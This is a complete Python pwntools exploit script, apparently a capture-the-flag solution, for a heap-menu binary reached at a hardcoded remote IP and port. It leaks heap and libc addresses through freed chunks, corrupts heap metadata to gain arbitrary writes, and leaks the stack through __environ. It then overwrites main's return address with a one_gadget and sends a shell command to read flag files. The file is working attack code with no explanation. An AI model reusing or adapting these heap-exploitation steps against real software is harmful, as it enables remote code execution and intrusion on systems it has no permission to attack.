from pwn import *

HOST = "39.96.193.120"
PORT = 10003

context.arch = "amd64"
context.os = "linux"
context.log_level = "info"
context.timeout = 4

elf = ELF("./combination_final", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

TINYPAD = elf.symbols["tinypad"]
ENVIRON_OFF = libc.symbols["__environ"]
MALLOC_HOOK_OFF = libc.symbols["__malloc_hook"]


def start():
    if args.LOCAL:
        return process(["wsl.exe", "bash", "-lc", "cd /mnt/c/temp/combo57 && ./debextract/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 --library-path ./debextract/lib/x86_64-linux-gnu ./combination_final"])
    return remote(HOST, PORT)


def add(io, size, content):
    io.sendlineafter(b"COMMAND >> ", b"A")
    io.sendlineafter(b"MEM_SIZE >> ", str(size).encode())
    io.sendlineafter(b"MEM_DATA >> ", content)


def delete(io, idx):
    io.sendlineafter(b"COMMAND >> ", b"D")
    io.sendlineafter(b"INDEX_ID >> ", str(idx).encode())


def edit(io, idx, content):
    io.sendlineafter(b"COMMAND >> ", b"E")
    io.sendlineafter(b"INDEX_ID >> ", str(idx).encode())
    io.sendlineafter(b"MEM_DATA >> ", content)
    io.sendlineafter(b"APPLY_CHANGE? (Y/n) >> ", b"Y")


def exploit(io):
    add(io, 0x80, b"1" * 0x80)
    add(io, 0x80, b"2" * 0x80)
    add(io, 0x80, b"3" * 0x80)
    add(io, 0x80, b"4" * 0x80)

    delete(io, 3)
    delete(io, 1)

    io.recvuntil(b"Deleted.")
    io.recvuntil(b"CONTENT: ")
    heap_base = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) - 0x120

    io.recvuntil(b"CONTENT: ")
    io.recvuntil(b"CONTENT: ")
    libc.address = u64(io.recv(6).ljust(8, b"\x00")) - 0x58 - MALLOC_HOOK_OFF - 0x10

    log.info("heap_base = %#x", heap_base)
    log.info("libc_base = %#x", libc.address)

    delete(io, 2)
    delete(io, 4)

    add(io, 0x10, b"1" * 0x10)
    add(io, 0x100, b"2" * 0xF8 + p64(0x11))
    add(io, 0x80, b"3" * 0x80)
    add(io, 0x80, b"4" * 0x80)

    delete(io, 1)
    add(io, 0x18, b"1" * 0x10 + p64(heap_base - TINYPAD))
    edit(io, 3, b"3" * 0x20 + p64(0) + p64(0x21) + p64(TINYPAD + 0x20) * 2 + p64(0x20))

    delete(io, 2)
    edit(io, 4, b"4" * 0x20 + p64(0) + p64(0x101) + p64(libc.symbols["__malloc_hook"] + 0x10 + 0x58) * 2)

    io.recvrepeat(0.2)
    add(io, 0xF0, b"2" * 0xD0 + p64(666) + p64(libc.address + ENVIRON_OFF) + b"a" * 8 + p64(TINYPAD + 0x108))

    io.recvuntil(b"INDEX: 1")
    io.recvuntil(b"CONTENT: ")
    stack_addr = u64(io.recv(6).ljust(8, b"\x00"))
    main_ret = stack_addr - 0xF0
    one_gadget = libc.address + 0x45226

    log.info("stack_addr = %#x", stack_addr)
    log.info("main_ret = %#x", main_ret)
    log.info("one_gadget = %#x", one_gadget)

    edit(io, 2, p64(main_ret))
    edit(io, 1, p64(one_gadget))

    io.sendlineafter(b"COMMAND >> ", b"Q")
    io.sendline(b"echo SHELL; /bin/cat /flag flag flag.txt ./flag ./flag.txt 2>/dev/null; exit")
    data = io.recvrepeat(2)
    print(data.decode("latin1", "replace"))


if __name__ == "__main__":
    io = start()
    exploit(io)
